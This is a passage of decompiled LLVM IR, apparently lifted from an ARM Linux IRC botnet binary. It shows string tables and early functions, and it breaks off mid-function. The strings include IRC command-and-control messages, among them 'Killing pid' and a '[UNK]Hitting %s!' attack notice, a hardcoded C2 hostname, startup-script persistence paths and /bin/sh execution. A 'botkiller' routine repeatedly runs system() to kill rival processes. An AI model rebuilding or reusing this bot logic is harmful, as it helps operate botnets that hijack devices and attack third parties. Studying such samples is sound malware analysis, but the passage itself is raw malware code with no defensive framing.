i8]* @global_var_13ad8.165, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_13ae0.166, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_13ae8.167, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_13af4.168, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_13b00.169, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_13b0c.170, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_13b1c.171, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_13b2c.172, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_13b3c.173, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_13b4c.174, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_13b58.175, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_13b64.176, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_13b74.177, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_13b84.178, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_13b94.179, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_13ba4.180, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_13bb0.181, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_13bc0.182, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_13bd4.183, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_13be0.184, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_13bec.185, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_13bfc.186, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_13c0c.187, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_135fc.48, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_13c18.188, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_13c24.189, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_13c2c.190, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_13c34.191, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_13c3c.192, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_13c44.193, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_13c4c.194, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_13c54.195, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_13c5c.196, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_13c64.197, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_13c6c.198, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_13c74.199, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_13c7c.200, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_13c84.201, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_13c8c.202, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_13c94.203, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_13c9c.204, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_13ca4.205, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_13cac.206, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_13cb4.207, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_13cbc.208, i32 0, i32 0), i8* bitcast (i32* @global_var_13cc4.209 to i8*), i8* bitcast (i32* @global_var_13cc8.210 to i8*), i8* bitcast (i32* @global_var_13ccc.211 to i8*), i8* bitcast (i32* @global_var_13cd0.212 to i8*), i8* bitcast (i32* @global_var_13cd4.213 to i8*), i8* bitcast (i32* @global_var_13cd8.214 to i8*), i8* bitcast (i32* @global_var_13cdc.215 to i8*), i8* bitcast (i32* @global_var_13ce0.216 to i8*), i8* bitcast (i32* @global_var_13ce4.217 to i8*), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_13ce8.218, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_13cec.219, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_13cf0.220, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_13cf4.221, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_13cf8.222, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_13cfc.223, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_13d00.224, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_13d04.225, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_13d08.226, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_13d0c.227, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_13d10.228, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_13d14.229, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_13d18.230, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_13d24.231, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_13d2c.232, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_13d34.233, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_13d3c.234, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_13d40.235, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_13d44.236, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_13d48.237, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_13d4c.238, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_13d50.239, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_13d54.240, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_13d58.241, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_13d5c.242, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_13d60.243, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_13d64.244, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_13d68.245, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_13d6c.246, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_13d70.247, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_13d74.248, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_13d78.249, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_13d7c.250, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_13d80.251, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_13d84.252, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_13d90.253, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_13d98.254, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_13da0.255, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_13da8.256, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_13db0.257, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_13db8.258, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_13dc0.259, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_13dc8.260, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_13dd0.261, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_13ddc.262, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_13de4.263, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_13dec.264, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_13df8.265, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_13e00.266, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_13e08.267, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_13e10.268, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_13e18.269, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_13e20.270, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_13e28.271, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_13e30.272, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_13e3c.273, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_13e44.274, i32 0, i32 0)]
@global_var_1ec00.283 = global i32 0
@global_var_1e7fc.287 = local_unnamed_addr global i32 0
@global_var_20e74.289 = global i32 0
@global_var_13e84.291 = constant [16 x i8] c"/usr/dict/words\00"
@global_var_13e94.293 = constant i32 114
@global_var_20e50.295 = global i32 0
@global_var_13e98.297 = constant [25 x i8] c"%s : USERID : UNIX : %s\0A\00"
@global_var_13eb4.299 = constant [4 x i8] c"std\00"
@global_var_20e70.302 = local_unnamed_addr global i32 0
@global_var_13eb8.304 = constant [29 x i8] c"PRIVMSG %s :Killing pid %d.\0A\00"
@global_var_13ed8.308 = constant [30 x i8] c"PRIVMSG %s :[UNK]Hitting %s!\0A\00"
@global_var_13e7c.310 = constant [6 x i8] c"pices\00"
@global_var_13ef8.311 = constant [4 x i8] c"STD\00"
@global_var_1e408.312 = local_unnamed_addr global [2 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_13e7c.310, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_13ef8.311, i32 0, i32 0)]
@global_var_20e58.315 = global i32 0
@global_var_13f3c.317 = constant i32 0
@global_var_1e40c.319 = global [4 x i8]* @global_var_13ef8.311
@global_var_13f40.322 = constant [15 x i8] c"MODE %s +pixB\0A\00"
@global_var_20e6c.325 = local_unnamed_addr global i32 0
@global_var_13f50.327 = constant [13 x i8] c"JOIN %s :%s\0A\00"
@global_var_13f60.329 = constant [8 x i8] c"WHO %s\0A\00"
@global_var_13f68.331 = constant [9 x i8] c"PONG %s\0A\00"
@global_var_1e7f8.334 = global i32 0
@global_var_13f74.342 = constant [16 x i8] c"[linux][armv4l]\00"
@global_var_20e5c.344 = global i32 0
@global_var_1e7ec.346 = global i32 0
@global_var_1e3fc.348 = local_unnamed_addr global i32 1
@global_var_13e64.350 = constant [22 x i8] c"irc.picesthegoatgg.ml\00"
@global_var_1e400.351 = global [22 x i8]* @global_var_13e64.350
@global_var_20e64.353 = global i32 0
@global_var_13fa4.355 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@global_var_13fb8.358 = constant [13 x i8] c"/etc/rc.conf\00"
@global_var_13fc8.360 = constant i32 47
@global_var_13fcc.362 = constant [8 x i8] c"\22%s%s\22\0A\00"
@global_var_13fd4.364 = constant i32 97
@global_var_13fd8.366 = constant [14 x i8] c"/usr/bin/sshd\00"
@global_var_20e60.371 = local_unnamed_addr global i32 0
@global_var_13fe8.374 = constant i32 35
@global_var_13fec.377 = constant i32 0
@global_var_20e54.379 = local_unnamed_addr global i32 0
@global_var_13ff0.383 = constant [9 x i8] c"PASS %s\0A\00"
@global_var_13ffc.385 = constant [41 x i8] c"NICK %s\0AUSER %s localhost localhost :%s\0A\00"
@global_var_14028.389 = constant i32 10
@global_var_13f84.391 = constant [4 x i8] c"352\00"
@global_var_1e434.392 = global [4 x i8]* @global_var_13f84.391
@global_var_1402c.394 = constant [6 x i8] c"ERROR\00"
@global_var_20e18.396 = global i32 0
@global_var_1e470 = external local_unnamed_addr global i32
@global_var_20e28.403 = global i32 0
@global_var_1e4a4.409 = global i32 0
@global_var_1ec04.411 = global i32 0
@global_var_d4a4.413 = constant i32 -481296384
@global_var_ae08.414 = constant i32 -442564544
@global_var_1ec08.416 = global i32 0
@global_var_20003.420 = global i32 0
@global_var_20000.421 = global i32 0
@global_var_1e4bc.424 = global i32 2
@global_var_1e48c.430 = global i32 0
@global_var_b1d0.431 = constant i32 -442564492
@global_var_1e488.433 = global i32* bitcast (i8** @global_var_1e4c0.399 to i32*)
@global_var_14334.439 = constant i32 0
@global_var_b390.444 = constant i32 -382910448
@global_var_ee04.445 = constant i32 -382909968
@global_var_eec0.446 = constant i32 -382910224
@global_var_14368.448 = constant i32 135270416
@global_var_1434c.450 = constant [6 x i8] c"(nil)\00"
@global_var_14354.453 = constant [7 x i8] c"(null)\00"
@global_var_1435c.455 = constant i32 2949163
@global_var_143e8.458 = constant i32 16843008
@global_var_143d0.460 = constant i32 327688
@global_var_1e7a4 = external global i32
@global_var_153a2.465 = constant i32 65536
@global_var_143c8.467 = constant [8 x i8] c" +0-#'I\00"
@global_var_14370.469 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_143b0.471 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_143a3.473 = constant i32 117506048
@global_var_143a4.475 = constant i32 252117248
@global_var_14394.477 = constant i32 331776
@global_var_14384.479 = constant i32 335616
@global_var_c8dc.511 = constant i32 -456978431
@global_var_14404.515 = constant [8 x i8] c"Success\00"
@global_var_143f4.517 = constant [15 x i8] c"Unknown error \00"
@global_var_1e7ac.519 = global i32* @global_var_153a2.465
@global_var_20c0c.521 = global i32 0
@global_var_20ddc.524 = global i32 0
@global_var_20c10.526 = global i32 0
@global_var_1e7b4.528 = global i32 0
@global_var_20eac.533 = global i32 0
@global_var_20ea0.536 = global i32 0
@global_var_20df0.538 = global i32 0
@global_var_1e6ac.541 = global i32 256
@global_var_1e5b0.542 = global i32* @global_var_1e6ac.541
@global_var_20e78.546 = global i32 0
@global_var_ebf4.547 = constant i32 -382910416
@global_var_d524.554 = constant i32 -442564520
@global_var_1e6b8.560 = global i32 0
@global_var_ec4c.562 = constant i32 -481230848
@global_var_20e08.564 = global i32 0
@global_var_ea58.566 = constant i32 -509587456
@global_var_1e6d0.568 = global i32 0
@global_var_1e6e8 = external global i32
@global_var_1e708.574 = global i32 -1726662223
@global_var_1e6f0.581 = local_unnamed_addr global i32* @global_var_1e708.574
@global_var_1e6ec.583 = global i32* @global_var_1e708.574
@global_var_14f60.597 = constant i32 0
@global_var_1f31d.601 = global i32 0
@global_var_14f88.605 = constant [8 x i8] c"/bin/sh\00"
@global_var_14f90.607 = constant [3 x i8] c"sh\00"
@global_var_14f94.609 = constant [3 x i8] c"-c\00"
@global_var_1e784.613 = global i32 0
@global_var_20e0c.617 = local_unnamed_addr global i32 0
@global_var_b2d8.620 = constant i32 -382910416
@global_var_20e14.622 = global i32 0
@global_var_1e000.625 = global i32 -1
@global_var_20e1c.628 = global i32 0
@global_var_20e20.630 = local_unnamed_addr global i32 0
@global_var_e548.631 = constant i32 -390234096
@global_var_14f98.633 = constant [10 x i8] c"/dev/null\00"
@global_var_20e24.635 = global i32 0
@global_var_b258.639 = constant i32 -382909968
@global_var_20e10.641 = local_unnamed_addr global i32 0
@global_var_c850.644 = constant i32 -369095438
@global_var_1e79c = external local_unnamed_addr global i32
@global_var_acd4.655 = constant i32 -442564608
@global_var_e810.657 = constant i32 -335544701
@global_var_e960.660 = constant i32 -275775369
@global_var_20e4c.663 = global i32 0
@global_var_20e2c.665 = global i32 0
@global_var_155a4.669 = constant [4 x i8] c"inf\00"
@global_var_155b8.672 = constant i32 1076101120
@global_var_155a7.677 = constant i32 1179535616
@global_var_155b4.679 = constant i32 2883630
@global_var_c4e4.681 = constant i32 -382908944
@global_var_20e30.689 = global i32 0
@global_var_20e48.694 = local_unnamed_addr global i32 0
@global_var_a9f4.699 = constant i32 -382910448
@global_var_20eb0.702 = global i32 0
@global_var_15600.704 = constant i32 46
@global_var_20e90.706 = global i32 0
@global_var_10aa4.708 = constant i32 -369098656
@global_var_15604.715 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_15618.717 = constant i32 114
@global_var_1561c.719 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_15634.722 = constant [11 x i8] c"nameserver\00"
@global_var_15640.725 = constant [7 x i8] c"domain\00"
@global_var_15648.727 = constant [7 x i8] c"search\00"
@global_var_20eb4.732 = global i32 0
@global_var_20f34.734 = global i32 0
@global_var_20f38.736 = global i32 0
@global_var_15664.745 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_15650.747 = constant i32 0
@global_var_15678.750 = constant [3 x i8] c"%x\00"
@global_var_1567c.753 = constant [11 x i8] c"/etc/hosts\00"
@global_var_15688.755 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_12cc8.760 = constant i32 -504313148
@global_var_12cb0.761 = constant i32 -483131392
@global_var_12b70.762 = constant i32 -481294847
@global_var_12d28.763 = constant i32 -477821825
@global_var_12e28.764 = constant i32 -476034303
@global_var_13114.765 = constant i32 -516685812
@global_var_13018.766 = constant i32 -905969576
@global_var_13194.767 = constant i32 -478149505
@global_var_1317c.768 = constant i32 -534773758
@global_var_13130.769 = constant i32 -534773758
@global_var_130c8.770 = constant i32 -483131392
@global_var_1e004.772 = global i32 0
@global_var_1e7d0.6 = external global i8*
@global_var_1e800.281 = external global i8*
@global_var_1e7f0.285 = external local_unnamed_addr global i8*
@global_var_1e7f4.336 = external local_unnamed_addr global i8*
@global_var_1e7f7.337 = external local_unnamed_addr global i8*
@global_var_1e7f6.338 = external local_unnamed_addr global i8*
@global_var_1e7f5.339 = external local_unnamed_addr global i8*
@1 = internal constant [3 x i8] c" \01\00"
@global_var_1e4c0.399 = global i8* getelementptr inbounds ([3 x i8], [3 x i8]* @1, i32 0, i32 0)
@global_var_1e510.400 = local_unnamed_addr global i8 16
@global_var_e55c.405 = constant i8 0
@global_var_1e4c1.436 = local_unnamed_addr global i8 1
@global_var_1e511.437 = local_unnamed_addr global i8 1
@2 = internal constant [2 x i8] c"\01\00"
@global_var_1e7b0.696 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @2, i32 0, i32 0)
@global_var_1e7b1.697 = local_unnamed_addr global i8 0

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_8098 = load i32, i32* @r4, align 4
  %v0_80a0 = call i32 @frame_dummy()
  store i32 %v0_80a0, i32* @r0, align 4
  %v1_80a4 = call i32 @__do_global_ctors_aux(i32 %v0_80a0)
  call void @__pseudo_branch(i32 %v3_8098)
  ret i32 %v1_80a4
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_80b0 = load i32, i32* @r4, align 4
  store i32 %v3_80b0, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i8** @global_var_1e7d0.6 to i32), i32* %r5.global-to-local, align 4
  %v2_80b8 = load i8, i8* bitcast (i8** @global_var_1e7d0.6 to i8*), align 4
  %v2_80bc = icmp eq i8 %v2_80b8, 0
  br i1 %v2_80bc, label %bb7, label %bb

bb:                                               ; preds = %entry
  %v12_80c0 = load i32, i32* @r0, align 4
  ret i32 %v12_80c0

bb7:                                              ; preds = %entry
  store i32 ptrtoint (i32** @global_var_1e01c.9 to i32), i32* %r4.global-to-local, align 4
  %v2_80c8 = load i32, i32* bitcast (i32** @global_var_1e01c.9 to i32*), align 4
  store i32 %v2_80c8, i32* %r2.global-to-local, align 4
  %v2_80d0 = icmp eq i32 %v2_80c8, 0
  br i1 %v2_80d0, label %bb8, label %dec_label_pc_80d8

dec_label_pc_80d8:                                ; preds = %bb7, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge
  %v1_80dc = phi i32 [ %v1_80dc.pre, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ ptrtoint (i32** @global_var_1e01c.9 to i32), %bb7 ]
  %v0_80d8 = phi i32 [ %v2_80e8, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ %v2_80c8, %bb7 ]
  %v1_80d8 = add i32 %v0_80d8, 4
  %v2_80dc = inttoptr i32 %v1_80dc to i32*
  store i32 %v1_80d8, i32* %v2_80dc, align 4
  %v0_80e4 = load i32, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v0_80e4)
  %v2_80e8 = load i32, i32* bitcast (i32** @global_var_1e01c.9 to i32*), align 4
  store i32 %v2_80e8, i32* %r2.global-to-local, align 4
  %v2_80f0 = icmp eq i32 %v2_80e8, 0
  br i1 %v2_80f0, label %.loopexit, label %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge

dec_label_pc_80d8.dec_label_pc_80d8_crit_edge:    ; preds = %dec_label_pc_80d8
  %v1_80dc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_80d8

.loopexit:                                        ; preds = %dec_label_pc_80d8
  %v2_8110.pre = load i32, i32* %r5.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %.loopexit, %bb7
  %v2_8110 = phi i32 [ %v2_8110.pre, %.loopexit ], [ ptrtoint (i8** @global_var_1e7d0.6 to i32), %bb7 ]
  %v3_8110 = inttoptr i32 %v2_8110 to i8*
  store i8 1, i8* %v3_8110, align 1
  %v2_8114 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8114, i32* %r4.global-to-local, align 4
  %v11_8114 = load i32, i32* @r0, align 4
  ret i32 %v11_8114

; uselistorder directives
  uselistorder i32 %v2_80e8, { 1, 2, 0 }
  uselistorder i32** @global_var_1e01c.9, { 1, 0 }
  uselistorder i8** @global_var_1e7d0.6, { 1, 0 }
  uselistorder label %dec_label_pc_80d8, { 1, 0 }
}

define i32 @call___do_global_dtors_aux() local_unnamed_addr {
entry:
  %v5_812c = load i32, i32* @r0, align 4
  ret i32 %v5_812c
}

define i32 @frame_dummy() local_unnamed_addr {
.thread:
  %v2_8150 = load i32, i32* @global_var_1e010.19, align 4
  %v2_8154 = icmp eq i32 %v2_8150, 0
  br i1 %v2_8154, label %bb, label %bb2

bb:                                               ; preds = %.thread
  ret i32 ptrtoint (i32* @global_var_1e010.19 to i32)

bb2:                                              ; preds = %.thread
  ret i32 ptrtoint (i32* @global_var_1e010.19 to i32)

; uselistorder directives
  uselistorder i32* @global_var_1e010.19, { 1, 0 }
}

define i32 @call_frame_dummy() local_unnamed_addr {
entry:
  %v5_818c = load i32, i32* @r0, align 4
  ret i32 %v5_818c
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_8198 = ptrtoint i32* %stack_var_4 to i32
  %v8_81b8 = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_9ee0.23 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32916, i32 79196, i32 %arg1, i32 %v4_8198)
  %v0_81bc = call i32 @abort()
  ret i32 %v0_81bc
}

define i32 @botkiller(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-100 = alloca i8*, align 4
  %v2_81d8 = ptrtoint i8** %stack_var_-100 to i32
  %v2_8224 = bitcast i8** %stack_var_-100 to i8*
  br label %dec_label_pc_81dc

dec_label_pc_81dc:                                ; preds = %dec_label_pc_828c, %entry
  br label %dec_label_pc_81e8

dec_label_pc_81e8:                                ; preds = %dec_label_pc_81dc, %dec_label_pc_81e8
  %storemerge45 = phi i32 [ 0, %dec_label_pc_81dc ], [ %v1_8278, %dec_label_pc_81e8 ]
  store i8* inttoptr (i32 1818848112 to i8*), i8** %stack_var_-100, align 4
  %v4_8214 = mul nuw nsw i32 %storemerge45, 4
  %v5_8214 = add i32 %v4_8214, ptrtoint ([246 x i8*]* @global_var_1e024.275 to i32)
  %v6_8214 = inttoptr i32 %v5_8214 to i32*
  %v7_8214 = load i32, i32* %v6_8214, align 4
  store i32 %v7_8214, i32* @r1, align 4
  %v3_8224 = call i32 @strcat(i8* %v2_8224, i32 %v7_8214)
  %v1_8230 = call i32 @__libc_system(i32 %v2_81d8)
  store i8* inttoptr (i32 1819044203 to i8*), i8** %stack_var_-100, align 4
  %v7_8254 = load i32, i32* %v6_8214, align 4
  store i32 %v7_8254, i32* @r1, align 4
  %v3_8264 = call i32 @strcat(i8* %v2_8224, i32 %v7_8254)
  %v1_8270 = call i32 @__libc_system(i32 %v2_81d8)
  %v1_8278 = add nuw nsw i32 %storemerge45, 1
  %v7_8288 = icmp slt i32 %v1_8278, 9
  br i1 %v7_8288, label %dec_label_pc_81e8, label %dec_label_pc_828c

dec_label_pc_828c:                                ; preds = %dec_label_pc_81e8
  %v1_8290 = call i32 @sleep(i32 5)
  br label %dec_label_pc_81dc

; uselistorder directives
  uselistorder i32 %storemerge45, { 1, 0 }
  uselistorder i8** %stack_var_-100, { 3, 2, 0, 1 }
  uselistorder i32 (i32)* @__libc_system, { 1, 0 }
  uselistorder label %dec_label_pc_81e8, { 1, 0 }
}

define i32 @strwildmatch(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp8 = ptrtoint i8* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_82a8 = load i32, i32* @r4, align 4
  %v6_82a8 = load i32, i32* @fp, align 4
  store i32 33456, i32* %stack_var_-4, align 4
  %v2_82ac = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_82ac, i32* @fp, align 4
  %v2_82c0 = load i8, i8* %arg1, align 1
  %v7_82cc = icmp eq i8 %v2_82c0, 42
  br i1 %v7_82cc, label %dec_label_pc_8300, label %dec_label_pc_82d4

dec_label_pc_82d4:                                ; preds = %entry
  %v7_82d8 = icmp eq i8 %v2_82c0, 63
  br i1 %v7_82d8, label %dec_label_pc_8370, label %dec_label_pc_82e0

dec_label_pc_82e0:                                ; preds = %dec_label_pc_82d4
  %v2_82e4 = icmp eq i8 %v2_82c0, 0
  br i1 %v2_82e4, label %dec_label_pc_82f0, label %dec_label_pc_83c8

dec_label_pc_82f0:                                ; preds = %dec_label_pc_82e0
  %v2_82f4 = load i8, i8* %tmp, align 1
  %v3_82f4 = zext i8 %v2_82f4 to i32
  br label %dec_label_pc_843c

dec_label_pc_8300:                                ; preds = %entry
  %v1_8304 = add i32 %tmp8, 1
  %v3_8310 = inttoptr i32 %v1_8304 to i8*
  %v4_8310 = call i32 @strwildmatch(i8* %v3_8310, i32 %arg2)
  %v2_8318 = icmp eq i32 %v4_8310, 0
  br i1 %v2_8318, label %dec_label_pc_835c, label %dec_label_pc_8320

dec_label_pc_8320:                                ; preds = %dec_label_pc_8300
  %v2_8324 = load i8, i8* %tmp, align 1
  %v2_8328 = icmp eq i8 %v2_8324, 0
  br i1 %v2_8328, label %dec_label_pc_8364, label %dec_label_pc_8330

dec_label_pc_8330:                                ; preds = %dec_label_pc_8320
  %v1_8334 = add i32 %arg2, 1
  %v4_8340 = call i32 @strwildmatch(i8* nonnull %arg1, i32 %v1_8334)
  %v2_8348 = icmp eq i32 %v4_8340, 0
  br i1 %v2_8348, label %dec_label_pc_835c, label %dec_label_pc_8364

dec_label_pc_835c:                                ; preds = %dec_label_pc_8330, %dec_label_pc_8300
  br label %dec_label_pc_8364

dec_label_pc_8364:                                ; preds = %dec_label_pc_8320, %dec_label_pc_8330, %dec_label_pc_835c
  %storemerge3 = phi i32 [ 0, %dec_label_pc_835c ], [ 1, %dec_label_pc_8330 ], [ 1, %dec_label_pc_8320 ]
  br label %dec_label_pc_843c

dec_label_pc_8370:                                ; preds = %dec_label_pc_82d4
  %v2_8374 = load i8, i8* %tmp, align 1
  %v2_8378 = icmp eq i8 %v2_8374, 0
  br i1 %v2_8378, label %dec_label_pc_83bc, label %dec_label_pc_8380

dec_label_pc_8380:                                ; preds = %dec_label_pc_8370
  %v1_8384 = add i32 %tmp8, 1
  %v1_838c = add i32 %arg2, 1
